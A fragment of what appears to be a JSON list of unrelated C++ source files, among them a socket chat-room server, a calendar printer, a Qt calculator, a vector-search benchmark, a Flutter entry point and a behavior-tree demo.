m_mipmap_count;\n}\n\nstd::optional<Color> ImageImpl::canvas_clear_color() const\n{\n    return m_canvas_clear_color;\n}\n\nvoid ImageImpl::set_canvas_clear_color(const std::optional<Color>& value)\n{\n    m_canvas_clear_color = value;\n}\n} // namespace cer::details",
    "// #include<bits/stdc++.h>\r\n// using namespace std;\r\n\r\n// const int IMAGE_WIDTH = 28;\r\n// const int IMAGE_HEIGHT = 28;\r\n// const int IMAGE_SIZE = IMAGE_WIDTH * IMAGE_HEIGHT;\r\n\r\n// vector<vector<uint8_t>> load_images(const string& filename) {\r\n//     ifstream file(filename, ios::binary);\r\n//     if (!file.is_open()) {\r\n//         throw runtime_error(\"Cannot open file: \" + filename);\r\n//     }\r\n\r\n//     // Read header\r\n//     int32_t magic_number = 0;\r\n//     int32_t number_of_images = 0;\r\n//     int32_t rows = 0;\r\n//     int32_t cols = 0;\r\n\r\n//     file.read(reinterpret_cast<char*>(&magic_number), sizeof(magic_number));\r\n//     file.read(reinterpret_cast<char*>(&number_of_images), sizeof(number_of_images));\r\n//     file.read(reinterpret_cast<char*>(&rows), sizeof(rows));\r\n//     file.read(reinterpret_cast<char*>(&cols), sizeof(cols));\r\n\r\n//     // Convert from big-endian to little-endian\r\n//     magic_number = __builtin_bswap32(magic_number);\r\n//     number_of_images = __builtin_bswap32(number_of_images);\r\n//     rows = __builtin_bswap32(rows);\r\n//     cols = __builtin_bswap32(cols);\r\n\r\n//     if (rows != IMAGE_HEIGHT || cols != IMAGE_WIDTH) {\r\n//         throw runtime_error(\"Unexpected image size\");\r\n//     }\r\n\r\n//     // Read the image data\r\n//     vector<vector<uint8_t>> images(number_of_images, vector<uint8_t>(IMAGE_SIZE));\r\n//     for (int i = 0; i < number_of_images; ++i) {\r\n//         file.read(reinterpret_cast<char*>(images[i].data()), IMAGE_SIZE);\r\n//     }\r\n\r\n//     file.close();\r\n//     return images;\r\n// }\r\n\r\n// vector<uint8_t> load_labels(const string& filename) {\r\n//     ifstream file(filename, ios::binary);\r\n//     if (!file.is_open()) {\r\n//         throw runtime_error(\"Cannot open file: \" + filename);\r\n//     }\r\n\r\n//     // Read header\r\n//     int32_t magic_number = 0;\r\n//     int32_t number_of_labels = 0;\r\n\r\n//     file.read(reinterpret_cast<char*>(&magic_number), sizeof(magic_number));\r\n//     file.read(reinterpret_cast<char*>(&number_of_labels), sizeof(number_of_labels));\r\n\r\n//     // Convert from big-endian to little-endian\r\n//     magic_number = __builtin_bswap32(magic_number);\r\n//     number_of_labels = __builtin_bswap32(number_of_labels);\r\n\r\n//     // Read the label data\r\n//     vector<uint8_t> labels(number_of_labels);\r\n//     file.read(reinterpret_cast<char*>(labels.data()), number_of_labels);\r\n\r\n//     file.close();\r\n//     return labels;\r\n// }\r\n\r\n// struct Weight{\r\n//     vector<double> w; // weights\r\n\r\n//     Weight(int size){\r\n//         w = vector<double>(size);\r\n//         srand(time(0));\r\n//         for (int i=0; i<size; i++){\r\n//             double random_value = (double)(rand()) / RAND_MAX;\r\n//             double random_number = random_value - 0.5;\r\n//             w[i] = random_number;\r\n//         }\r\n//     }\r\n// };\r\n\r\n// struct Bias{\r\n//     double b; // bias\r\n\r\n//     Bias(){\r\n//         b = 0.0;\r\n//     }\r\n// };\r\n// struct Layer {\r\n//     vector<Weight> w; // weights\r\n//     vector<Bias> b;   // bias\r\n    \r\n//     Layer(int size, int input_size) {\r\n//         for (int i = 0; i < size; ++i) {\r\n//             w.push_back(Weight(input_size));\r\n//             b.push_back(Bias());\r\n//         }\r\n//     }\r\n// };\r\n\r\n// class Model{\r\n//     public:\r\n//         vector<Layer> layers;\r\n//         vector <vector<int>> layerValues;\r\n\r\n//         void dense(int size , int input_size){\r\n//             layers.push_back(Layer(size , input_size));\r\n//         }\r\n\r\n//         void train(vector<vector<int>> x){ // vector of all flattened images (\"features\")\r\n//             for(int i =0; i < x.size(); ++i){\r\n//                 forwardPropagation(x[i]);\r\n//                 // backPropagation(x[i]);\r\n//             }\r\n//         }\r\n//     private:\r\n//         void forwardPropagation(vector<int> x){\r\n//             layerValues.push_back(x);\r\n//             for(auto& layer: layers){\r\n//                 int size = layer.w.size();\r\n//                 vector <int> prevLayerValues = layerValues[layerValues.size()-1];\r\n//                 vector <int> currLayerValues(size);\r\n//                 for(int i = 0; i < size; ++i){ // a single neuron has w[i] weights and b[i] bias\r\n//                     int currVal = 0;\r\n//                     for (int j=0; j<layer.w[i].w.size(); j++){\r\n//                         currVal += (layer.w[i].w[j]* prevLayerValues[j]);\r\n//                     }\r\n//                     currVal += layer.b[i].b;\r\n//                     currLayerValues.push_back(currVal);\r\n//                 }\r\n//                 layerValues.push_back(currLayerValues);\r\n//             }\r\n//         }\r\n//         void backPropagation(vector<int> x){\r\n\r\n//         }\r\n// };\r\n\r\n// int main(){\r\n//     Model model;\r\n//     model.dense(128 , IMAGE_SIZE);\r\n//     model.dense(64 , 128);\r\n//     model.dense(10 , 16);\r\n//     cout << model.layers.size() << '\\n';\r\n//     cout << model.layers[0].w.size() << '\\n';\r\n//     cout << \"Weights of 1st layer 1st node: \" << endl;\r\n\r\n//     for (int i=0; i<model.layers[0].w[0",
    "#include <bits/stdc++.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <errno.h>\n#include <string.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <thread>\n#include <mutex>\n#define MAX_LEN 200\n#define NUM_COLORS 6\n\nusing namespace std;\n\nstruct terminal\n{\n\tint id;\n\tstring name;\n\tint socket;\n\tthread th;\n};\n\nvector<terminal> clients;\nstring def_col=\"\\033[0m\";\nstring colors[]={\"\\033[31m\", \"\\033[32m\", \"\\033[33m\", \"\\033[34m\", \"\\033[35m\",\"\\033[36m\"};\nint seed=0;\nmutex cout_mtx,clients_mtx;\n\nstring color(int code);\nvoid set_name(int id, char name[]);\nvoid shared_print(string str, bool endLine);\nint broadcast_message(string message, int sender_id);\nint broadcast_message(int num, int sender_id);\nvoid end_connection(int id);\nvoid handle_client(int client_socket, int id);\n\nint main()\n{\n\tint server_socket;\n\tif((server_socket=socket(AF_INET,SOCK_STREAM,0))==-1)\n\t{\n\t\tperror(\"socket: \");\n\t\texit(-1);\n\t}\n\n\tstruct sockaddr_in server;\n\tserver.sin_family=AF_INET;\n\tserver.sin_port=htons(10000);\n\tserver.sin_addr.s_addr=INADDR_ANY;\n\tbzero(&server.sin_zero,0);\n\n\tif((bind(server_socket,(struct sockaddr *)&server,sizeof(struct sockaddr_in)))==-1)\n\t{\n\t\tperror(\"bind error: \");\n\t\texit(-1);\n\t}\n\n\tif((listen(server_socket,8))==-1)\n\t{\n\t\tperror(\"listen error: \");\n\t\texit(-1);\n\t}\n\n\tstruct sockaddr_in client;\n\tint client_socket;\n\tunsigned int len=sizeof(sockaddr_in);\n\n\tcout<<colors[NUM_COLORS-1]<<\"\\n\\t  ====== Welcome to the chat-room ======   \"<<endl<<def_col;\n\n\twhile(1)\n\t{\n\t\tif((client_socket=accept(server_socket,(struct sockaddr *)&client,&len))==-1)\n\t\t{\n\t\t\tperror(\"accept error: \");\n\t\t\texit(-1);\n\t\t}\n\t\tseed++;\n\t\tthread t(handle_client,client_socket,seed);\n\t\tlock_guard<mutex> guard(clients_mtx);\n\t\tclients.push_back({seed, string(\"Anonymous\"),client_socket,(move(t))});\n\t}\n\n\tfor(int i=0; i<clients.size(); i++)\n\t{\n\t\tif(clients[i].th.joinable())\n\t\t\tclients[i].th.join();\n\t}\n\n\tclose(server_socket);\n\treturn 0;\n}\n\nstring color(int code)\n{\n\treturn colors[code%NUM_COLORS];\n}\n\n// Set name of client\nvoid set_name(int id, char name[])\n{\n\tfor(int i=0; i<clients.size(); i++)\n\t{\n\t\t\tif(clients[i].id==id)\t\n\t\t\t{\n\t\t\t\tclients[i].name=string(name);\n\t\t\t}\n\t}\t\n}\n\n// For synchronisation of cout statements\nvoid shared_print(string str, bool endLine=true)\n{\t\n\tlock_guard<mutex> guard(cout_mtx);\n\tcout<<str;\n\tif(endLine)\n\t\t\tcout<<endl;\n}\n\n// Broadcast message to all clients except the sender\nint broadcast_message(string message, int sender_id)\n{\n\tchar temp[MAX_LEN];\n\tstrcpy(temp,message.c_str());\n\tfor(int i=0; i<clients.size(); i++)\n\t{\n\t\tif(clients[i].id!=sender_id)\n\t\t{\n\t\t\tsend(clients[i].socket,temp,sizeof(temp),0);\n\t\t}\n\t}\t\t\n}\n\n// Broadcast a number to all clients except the sender\nint broadcast_message(int num, int sender_id)\n{\n\tfor(int i=0; i<clients.size(); i++)\n\t{\n\t\tif(clients[i].id!=sender_id)\n\t\t{\n\t\t\tsend(clients[i].socket,&num,sizeof(num),0);\n\t\t}\n\t}\t\t\n}\n\nvoid end_connection(int id)\n{\n\tfor(int i=0; i<clients.size(); i++)\n\t{\n\t\tif(clients[i].id==id)\t\n\t\t{\n\t\t\tlock_guard<mutex> guard(clients_mtx);\n\t\t\tclients[i].th.detach();\n\t\t\tclients.erase(clients.begin()+i);\n\t\t\tclose(clients[i].socket);\n\t\t\tbreak;\n\t\t}\n\t}\t\t\t\t\n}\n\nvoid handle_client(int client_socket, int id)\n{\n\tchar name[MAX_LEN],str[MAX_LEN];\n\trecv(client_socket,name,sizeof(name),0);\n\tset_name(id,name);\t\n\n\t// Display welcome message\n\tstring welcome_message=string(name)+string(\" has joined\");\n\tbroadcast_message(\"#NULL\",id);\t\n\tbroadcast_message(id,id);\t\t\t\t\t\t\t\t\n\tbroadcast_message(welcome_message,id);\t\n\tshared_print(color(id)+welcome_message+def_col);\n\t\n\twhile(1)\n\t{\n\t\tint bytes_received=recv(client_socket,str,sizeof(str),0);\n\t\tif(bytes_received<=0)\n\t\t\treturn;\n\t\tif(strcmp(str,\"#exit\")==0)\n\t\t{\n\t\t\t// Display leaving message\n\t\t\tstring message=string(name)+string(\" has left\");\t\t\n\t\t\tbroadcast_message(\"#NULL\",id);\t\t\t\n\t\t\tbroadcast_message(id,id);\t\t\t\t\t\t\n\t\t\tbroadcast_message(message,id);\n\t\t\tshared_print(color(id)+message+def_col);\n\t\t\tend_connection(id);\t\t\t\t\t\t\t\n\t\t\treturn;\n\t\t}\n\t\tbroadcast_message(string(name),id);\t\t\t\t\t\n\t\tbroadcast_message(id,id);\t\t\n\t\tbroadcast_message(string(str),id);\n\t\tshared_print(color(id)+name+\" : \"+def_col+str);\t\t\n\t}\t\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n// Base class to handle year, month, and days calculation\r\nclass Calendar {\r\nprotected:\r\n    int year;\r\n    int month;\r\n    int daysInMonth;\r\n    int startDay;\r\n\r\npublic:\r\n    Calendar(int y, int m) : year(y), month(m) {\r\n        calculateDaysInMonth();\r\n        calculateStartDay();\r\n    }\r\n    // Calculate the number of days in the specified month\r\n    void calculateDaysInMonth() {\r\n        switch (month) {\r\n            case 1: case 3: case 5: case 7: case 8: case 10: case 12:\r\n                daysInMonth = 31;\r\n                break;\r\n            case 4: case 6: case 9: case 11:\r\n                daysInMonth = 30;\r\n                break;\r\n            case 2:if ((year % 4 == 0 && year % 100 != 0) || year % 400 == 0)\r\n                    daysInMonth = 29;\r\n                else\r\n                    daysInMonth = 28;\r\n                break;\r\n            default:\r\n                daysInMonth = 0; // Invalid month\r\n                }}\r\n    // Calculate the starting day of the week for the first day of the month\r\n    //Zeller's Congruence\r\n    void calculateStartDay() {\r\n        startDay = (year + (year / 4) - (year / 100) + (year / 400) + ((13 * month + 8) / 5) + 1) % 7;\r\n    }\r\n};\r\n// Derived class to handle the monthly calendar display\r\nclass MonthlyCalendar : public Calendar {\r\npublic:\r\n    MonthlyCalendar(int y, int m) : Calendar(y, m) {}\r\n\r\n    void displayCalendar() {\r\n        if (month < 1 || month > 12) {\r\n            cout << \"Invalid month entered. Please enter a number between 1 and 12.\" << endl;\r\n            return;\r\n        }\r\n        cout << \"Sun Mon Tue Wed Thu Fri Sat\" << endl;\r\n        for (int i = 0; i < startDay; i++) {\r\n            cout << \"    \";\r\n        }\r\n        for (int day = 1; day <= daysInMonth; day++) {\r\n            cout << \" \";\r\n            if (day < 10)\r\n                cout << \" \";\r\n            cout << day << \" \";\r\n\r\n            if ((startDay + day) % 7 == 0)\r\n                cout << endl;\r\n        }\r\n        cout << endl;\r\n    }\r\n};\r\n\r\nint main() {\r\n    int year, month;\r\n\r\n    cout << \"Enter year: \";\r\n    cin >> year;\r\n\r\n    cout << \"Enter month (1-12): \";\r\n    cin >> month;\r\n\r\n    MonthlyCalendar calendar(year, month);\r\n    calendar.displayCalendar();\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n\n#include <curl/curl.h>\n\n// Callback function to write data received from the server\nsize_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)\n{\n    size_t total_size = size * nmemb;\n    ((std::string*)userp)->append((char*)contents, total_size);\n    return total_size;\n}\n\nint main()\n{\n    curl_version_info_data* info = curl_version_info(CURLVERSION_NOW);\n    if (info)\n    {\n        std::cout << \"libcurl version: \" << info->version << std::endl;\n        std::cout << \"SSL version: \" << info->ssl_version << std::endl;\n        std::cout << \"Libz version: \" << info->libz_version << std::endl;\n        std::cout << \"Features: \" << info->features << std::endl;\n\n        const char *const *protocols = info->protocols;\n        if (protocols)\n        {\n            std::cout << \"Supported protocols: \";\n            for (int i = 0; protocols[i] != NULL; ++i)\n            {\n                std::cout << protocols[i] << \" \";\n            }\n            std::cout << std::endl;\n        }\n    }\n    else\n    {\n        std::cerr << \"Failed to get libcurl version info.\" << std::endl;\n    }\n\n    CURL *curl;\n    CURLcode res;\n    std::string readBuffer;\n\n    // Initialize libcurl\n    curl = curl_easy_init();\n    if (curl) {\n        // Set the URL\n        curl_easy_setopt(curl, CURLOPT_URL, \"http://localhost:8000\");\n\n        // Set the callback function to handle the response\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);\n\n        // Perform the request\n        res = curl_easy_perform(curl);\n\n        // Check for errors\n        if (res != CURLE_OK)\n        {\n            std::cerr << \"curl_easy_perform() failed: \" << curl_easy_strerror(res) << std::endl;\n        }\n        else\n        {\n            // Print the response data\n            std::cout << \"Response data: \" << readBuffer << std::endl;\n        }\n\n        // Clean up\n        curl_easy_cleanup(curl);\n    }\n    else\n    {\n        std::cerr << \"Failed to initialize libcurl\" << std::endl;\n    }\n\n    return 0;\n}",
    "#include \"mainwindow.h\"\n\n#include <QWheelEvent>\n\n#include \"ui_mainwindow.h\"\n\nQString userstring = \"\";\nQString backendstring = \"\";\ndouble lastXMax = 1, lastYMax = 1, lastXMin = -1, lastYMin = -1, lastH = 0.02;\nint bracketscount = 0;\nint dotcount = 0;\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent), ui(new Ui::MainWindow) {\n  ui->setupUi(this);\n  ui->widget->setInteractions(QCP::iRangeZoom | QCP::iRangeDrag);\n  validators();\n  connect(ui->widget->xAxis, SIGNAL(rangeChanged(const QCPRange &)), this,\n          SLOT(onAxisRangeChanged(const QCPRange &)));\n  connect(ui->widget->yAxis, SIGNAL(rangeChanged(const QCPRange &)), this,\n          SLOT(onAxisRangeChanged(const QCPRange &)));\n}\n\nvoid MainWindow::validators() {\n  QDoubleValidator *vfx =\n      new QDoubleValidator(-(__DBL_MAX__), __DBL_MAX__, 7, this);\n  vfx->setNotation(QDoubleValidator::StandardNotation);\n  ui->edit_x->setValidator(vfx);\n  QDoubleValidator *for_bank = new QDoubleValidator(0, __DBL_MAX__, 2, this);\n  for_bank->setNotation(QDoubleValidator::StandardNotation);\n  QDoubleValidator *for_bank_p = new QDoubleValidator(0, __DBL_MAX__, 7, this);\n  for_bank_p->setNotation(QDoubleValidator::StandardNotation);\n  ui->edit_percent->setValidator(for_bank_p);\n  ui->edit_sum->setValidator(for_bank);\n}\n\nMainWindow::~MainWindow() { delete ui; }\n\nvoid MainWindow::on_button_1_clicked() {\n  if (!for_digits(backendstring)) {\n    userstring.push_back('1');\n    backendstring.push_back('1');\n    ui->label_input->setText(userstring);\n  }\n}\n\nvoid MainWindow::on_button_2_clicked() {\n  if (!for_digits(backendstring)) {\n    userstring.push_back('2');\n    backendstring.push_back('2');\n    ui->label_input->setText(userstring);\n  }\n}\n\nvoid MainWindow::on_button_3_clicked() {\n  if (!for_digits(backendstring)) {\n    userstring.push_back('3');\n    backendstring.push_back('3');\n    ui->label_input->setText(userstring);\n  }\n}\n\nvoid MainWindow::on_button_4_clicked() {\n  if (!for_digits(backendstring)) {\n    userstring.push_back('4');\n    backendstring.push_back('4');\n    ui->label_input->setText(userstring);\n  }\n}\n\nvoid MainWindow::on_button_5_clicked() {\n  if (!for_digits(backendstring)) {\n    userstring.push_back('5');\n    backendstring.push_back('5');\n    ui->label_input->setText(userstring);\n  }\n}\n\nvoid MainWindow::on_button_6_clicked() {\n  if (!for_digits(backendstring)) {\n    userstring.push_back('6');\n    backendstring.push_back('6');\n    ui->label_input->setText(userstring);\n  }\n}\n\nvoid MainWindow::on_button_plus_clicked() {\n  if (backendstring.isEmpty() || backendstring.right(1) == \"(\") {\n    userstring.push_back('+');\n    backendstring.push_back('#');\n  } else {\n    if (!simple_operator_input_check(&userstring, &backendstring)) {\n      userstring.push_back('+');\n      backendstring.push_back('+');\n    }\n  }\n  dotcount = 0;\n  ui->label_input->setText(userstring);\n}\n\nvoid MainWindow::on_button_AC_clicked() {\n  userstring.clear();\n  backendstring.clear();\n  bracketscount = 0;\n  dotcount = 0;\n  ui->label_input->setText(\"0\");\n  ui->label_rez->clear();\n  ui->widget->clearGraphs();\n  ui->widget->replot();\n}\n\nvoid MainWindow::on_button_rez_clicked() {\n  ui->label_rez->clear();\n  QString backendstringtemp = backendstring;\n  if (backendstringtemp.contains('X')) {\n    double term = 0;\n    if (ui->edit_x->text().length() > 0) {\n      term = ui->edit_x->text().toDouble();\n    }\n    backendstringtemp.replace('X', QString::number(term));\n    //        userstring.replace('X', QString::number(term));\n\n    ui->label_input->setText(userstring);\n  }\n  //    if (backendstring.length() == 1 && (backendstring.contains(\"~\") ||\n  //    backendstring.contains(\"#\")))\n  if (!for_unar_check(backendstringtemp)) {\n    ui->label_rez->setText(userstring);\n  } else {\n    QByteArray array = backendstringtemp.toLatin1();\n    char *stringtocalc = array.data();\n    if (calcbracketinfix(stringtocalc) == 0) {\n      double res = calc(stringtocalc);\n      ui->label_rez->setText(QString::number(res));\n    } else {\n      ui->label_rez->setText(\"Error\");\n    }\n  }\n  backendstringtemp.clear();\n}\n\nvoid MainWindow::on_button_minus_clicked() {\n  if (backendstring.isEmpty() || backendstring.right(1) == \"(\") {\n    userstring.push_back('-');\n    backendstring.push_back('~');\n  } else {\n    if (!simple_operator_input_check(&userstring, &backendstring)) {\n      userstring.push_back('-');\n      backendstring.push_back('-');\n    }\n  }\n  dotcount = 0;\n  ui->label_input->setText(userstring);\n}\n\nvoid MainWindow::on_button_mul_clicked() {\n  if (!simple_operator_input_check(&userstring, &backendstring))\n    if (!backendstring.isEmpty() && backendstring.right(1) != \"(\") {\n      userstring.push_back('*');\n      backendstring.push_back('*');\n      ui->label_input->setText(userstring);\n      dotcount = 0;\n    }\n}\n\nvoid MainWindow::on_button_div_clicked() {\n  if (!simple_operator_input_check(&userstring, &backendstring))\n    if (!backendstring.isEmpty() && backendstring.right(1) != \"(\") {\n      userstring.push_back",
    "#define HIGH_ACC_FAST_SCAN\n#define EIGEN_DONT_PARALLELIZE\n#include <fstream>\n#include <iostream>\n#include <unordered_set>\n#include <vector>\n\n#include \"defines.hpp\"\n#include \"index/IVF.hpp\"\n#include \"utils/IO.hpp\"\n#include \"utils/StopW.hpp\"\n\nsize_t TOPK = 100;\nsize_t ROUND = 3;\n\nstd::vector<size_t> get_nprobes(\n    const IVF& ivf,\n    const std::vector<size_t>& all_nprobes,\n    FloatRowMat& rotated_query,\n    FloatRowMat& data,\n    UintRowMat& gt\n);\nint main(int argc, char* argv[]) {\n    assert(argc == 3);\n    char* DATASET = argv[1];\n    int B = atoi(argv[2]);\n    assert(B == 9 || B == 5 || B == 7 || B == 3 || B == 4 || B == 8);\n\n    char data_file[500];\n    char query_file[500];\n    char gt_file[500];\n    char ivf_file[500];\n    char result_file[500];\n\n    sprintf(data_file, \"../data/%s/%s_base.fvecs\", DATASET, DATASET);\n    sprintf(query_file, \"../data/%s/%s_query.fvecs\", DATASET, DATASET);\n    sprintf(gt_file, \"../data/%s/%s_groundtruth.ivecs\", DATASET, DATASET);\n    sprintf(ivf_file, \"../data/%s/ivf_exhaf%d.index\", DATASET, B);\n    sprintf(result_file, \"../results/exrabitq/%s_exhaf%d.csv\", DATASET, B);\n\n    FloatRowMat data;\n    FloatRowMat query;\n    UintRowMat gt;\n\n    load_vecs<float, FloatRowMat>(data_file, data);\n    load_vecs<float, FloatRowMat>(query_file, query);\n    load_vecs<PID, UintRowMat>(gt_file, gt);\n\n    size_t N = data.rows();\n    size_t DIM = data.cols();\n    size_t NQ = query.rows();\n\n    std::cout << \"data loaded\\n\";\n    std::cout << \"\\tN: \" << N << '\\n' << \"\\tDIM: \" << DIM << '\\n';\n    std::cout << \"query loaded\\n\";\n    std::cout << \"\\tNQ: \" << NQ << '\\n';\n\n    IVF ivf;\n    ivf.load(ivf_file);\n\n    std::vector<size_t> all_nprobes;\n    all_nprobes.push_back(5);\n    for (size_t i = 10; i < 200; i += 10) {\n        all_nprobes.push_back(i);\n    }\n    for (size_t i = 200; i < 400; i += 40) {\n        all_nprobes.push_back(i);\n    }\n    for (size_t i = 400; i <= 1500; i += 100) {\n        all_nprobes.push_back(i);\n    }\n    for (size_t i = 2000; i <= 4000; i += 500) {\n        all_nprobes.push_back(i);\n    }\n\n    all_nprobes.push_back(6000);\n    all_nprobes.push_back(10000);\n    all_nprobes.push_back(15000);\n\n    size_t total_count = NQ * TOPK;\n    StopW stopw;\n\n    FloatRowMat padded_query(NQ, ivf.padded_dim());\n    padded_query.setZero();\n    FloatRowMat rotated_query(NQ, ivf.padded_dim());\n    for (size_t i = 0; i < NQ; ++i) {\n        std::memcpy(&padded_query(i, 0), &query(i, 0), sizeof(float) * DIM);\n    }\n    Rotator& rp = ivf.rotator();\n    stopw.reset();\n    rp.rotate(padded_query, rotated_query);\n    float rotate_time = stopw.getElapsedTimeMicro();\n\n    auto nprobes = get_nprobes(ivf, all_nprobes, rotated_query, data, gt);\n    size_t length = nprobes.size();\n\n    std::vector<std::vector<float>> all_qps(ROUND, std::vector<float>(length));\n    std::vector<std::vector<float>> all_recall(ROUND, std::vector<float>(length));\n    std::vector<std::vector<float>> all_ratio(ROUND, std::vector<float>(length));\n\n    for (size_t r = 0; r < ROUND; r++) {\n        for (size_t i = 0; i < length; ++i) {\n            size_t nprobe = nprobes[i];\n            size_t total_correct = 0;\n            double total_ratio = 0;\n            float total_time = 0;\n            PID results[TOPK];\n            for (size_t i = 0; i < NQ; i++) {\n                stopw.reset();\n                ivf.search(&rotated_query(i, 0), data.data(), TOPK, nprobe, results);\n                total_time += stopw.getElapsedTimeMicro();\n                total_ratio += get_ratio(i, query, data, gt, results, TOPK, L2Sqr);\n                for (size_t j = 0; j < TOPK; j++) {\n                    for (size_t k = 0; k < TOPK; k++) {\n                        if (gt(i, k) == results[j]) {\n                            total_correct++;\n                            break;\n                        }\n                    }\n                }\n            }\n            float qps = NQ / ((total_time + rotate_time) / 1e6);\n            float recall = static_cast<float>(total_correct) / total_count;\n            float ratio = total_ratio / total_count;\n\n            all_qps[r][i] = qps;\n            all_recall[r][i] = recall;\n            all_ratio[r][i] = ratio;\n        }\n    }\n\n    auto avg_qps = horizontal_avg(all_qps);\n    auto avg_recall = horizontal_avg(all_recall);\n    auto avg_ratio = horizontal_avg(all_ratio);\n\n    std::ofstream csv_data(result_file, std::ios::out);\n    csv_data << \"nprobe,QPS,recall,ratio\" << std::endl;\n\n    for (size_t i = 0; i < length; ++i) {\n        size_t nprobe = nprobes[i];\n        float qps = avg_qps[i];\n        float recall = avg_recall[i];\n        float ratio = avg_ratio[i];\n\n        csv_data << nprobe << ',';\n        csv_data << qps << ',';\n        csv_data << recall << ',';\n        csv_data << ratio << '\\n';\n    }\n    csv_data.close();\n\n    return 0;\n}\n\nstd::vector<size_t> get_nprobes(\n    const IVF& ivf,\n    const std::vector<size_t>& all_nprobes,\n    FloatRowMat& rotated_query,\n    FloatRowMat& data,\n    UintRowMat& gt\n) {\n    Sto",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"home_buysell\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"BehaviorTree.h\"\n\nclass MyDebugAction : public Nano::BehaviorTree::Action {\npublic:\n\tMyDebugAction(std::string uid) : Action(uid) {}\nprotected:\n\tNano::BehaviorTree::Behavior::EStatus onUpdate() override {\n\t\tstd::cout << \"Action:\" << m_uid << std::endl;\n\t\treturn EStatus::Success;\n\t}\n};\n\nint main()\n{\n\tNano::BehaviorTree::BehaviorTreeBuilder::Ptr builder1 = std::make_shared<Nano::BehaviorTree::BehaviorTreeBuilder>();\n\tbuilder1->Repeat(\"1\", 3)\n\t\t\t\t->Sequence(\"2\")\n\t\t\t\t\t->Action(std::make_shared<MyDebugAction>(\"hello\"))\n\t\t\t\t\t->Action(std::make_shared<MyDebugAction>(\"world\"))\n\t\t\t\t->Back()\n\t\t\t->End();\n\tbuilder1->treeTick();\t// / hello world hello world hello world\n\n\tNano::BehaviorTree::BehaviorTreeBuilder::Ptr builder2 = std::make_shared<Nano::BehaviorTree::BehaviorTreeBuilder>();\n\tbuilder2->Sequence(\"RootSeq\")\n\t\t->Selector(\"MainSelc\")\n\t\t\t->Action(std::make_shared<MyDebugAction>(\"1\"))\n\t\t\t\t->Action(std::make_shared<MyDebugAction>(\"2\")) // \u9009\u62e9\u5668\u4e0b\u4e0d\u6267\u884c\n\t\t\t->Back()\n\t\t->Parallel(\"ParallelTasks\", Nano::BehaviorTree::Parallel::Policy::RequireAll, Nano::BehaviorTree::Parallel::Policy::RequireOne)\n\t\t\t->Action(std::make_shared<MyDebugAction>(\"3\"))\t\n\t\t\t->Action(std::make_shared<MyDebugAction>(\"4\"))\n\t\t\t->Action(std::make_shared<MyDebugAction>(\"5\"))\n\t\t\t->Action(std::make_shared<MyDebugAction>(\"6\"))\t// \u5168\u6267\u884c\u5e76\u884c\u5668\n\t\t->End();\n\tbuilder2->treeTick();\t/// 1 3 4 5 6\n\n\treturn 0;\n}\n\n",
    "#include <iostream>\n#include <vector>\n#include <complex>\n#include <algorithm>\n#include <random>\n#include <iterator>\n#include <cmath>\n#include <map>\n#include <thread>\n#include <mutex>\n#include <atomic>\n#include <vector>\n#include <chrono>\n#include <mplapack/mpblas_mpfr.h>\n#include <mplapack/mplapack_mpfr.h>\n\n#include \"zle.h\"\n\nusing mpreal = mpfr::mpreal;\nusing mpcomplex = mpfr::mpcomplex;\n\nstruct ExtractionParams {\n    int midpoint_value;\n    mpreal midpoint;\n};\n\nstruct Dynamics {\n    std::vector<mpreal> real_values;\n    std::vector<mpreal> indicator_values;\n};\n\nmpcomplex* psuedo_symbolic_matrix_segment(const std::vector<SymX>& A, int n, int batch_index, int batch_size, const std::vector<std::string>& symbols, const Dynamics& dynamics) {\n    std::vector<mpreal> real_values = dynamics.real_values;\n    std::vector<mpreal> indicator_values = dynamics.indicator_values;\n\n    mpcomplex *complex_values_for_substitution = new mpcomplex[n];\n\n    // Copy real_values into real part of complex_values_for_substitution\n    for (int i = 0; i < n; ++i) {\n        complex_values_for_substitution[i] = mpcomplex(real_values[i], 0);\n    }\n\n    // Copy indicator_values into imaginary part of complex_values_for_substitution\n    for (int i = batch_index * batch_size; i < std::min(n, (batch_index + 1) * batch_size); ++i) {\n        complex_values_for_substitution[i] = mpcomplex(real_values[i], indicator_values[i - batch_index * batch_size]);\n    }\n\n    // Create mapping from symbols to substitution values\n    std::map<std::string, mpcomplex> mapping;\n    for (int i = 0; i < n; ++i) {\n        mapping[symbols[i]] = complex_values_for_substitution[i];\n    }\n\n    // Create a \"copy\" of A, Af using an mpfr compatible matrix of mpcomplex\n    mpcomplex *Af = new mpcomplex[n * n];\n\n    // Elements of Af correspond to elements of A with the symbols replaced by substitution values\n    for (int i = 0; i < n * n; ++i) {\n        mpreal coef(A[i].coef);\n        if (A[i].coef == 0) {\n            Af[i] = mpcomplex(coef, coef);\n        } else {\n            Af[i] = coef * mapping.at(A[i].symbol);\n        }    \n    }\n\n    delete[] complex_values_for_substitution;\n    \n    return 